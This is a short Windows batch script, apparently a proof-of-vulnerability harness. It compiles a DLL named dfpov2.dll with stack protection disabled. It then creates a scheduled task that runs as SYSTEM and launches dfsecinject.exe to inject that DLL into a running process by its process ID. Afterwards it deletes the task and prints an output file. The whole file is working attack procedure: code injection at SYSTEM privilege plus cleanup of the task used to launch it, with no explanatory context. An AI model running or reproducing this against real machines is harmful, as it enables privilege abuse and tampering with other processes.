@echo off
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat" >nul
cd /d C:\Users\User\trackA
cl /nologo /std:c++17 /O2 /EHsc /MT /GS- /LD dfpov2.cpp /Fe:dfpov2.dll /link user32.lib > pov2_build.log 2>&1
echo P2=%errorlevel%
type pov2_build.log
schtasks /create /tn dfa_p2 /tr "C:\Users\User\trackA\dfsecinject.exe 50552 C:\Users\User\trackA\dfpov2.dll" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f >nul
schtasks /run /tn dfa_p2
ping -n 6 127.0.0.1 >nul
schtasks /delete /tn dfa_p2 /f >nul
type pov2.txt
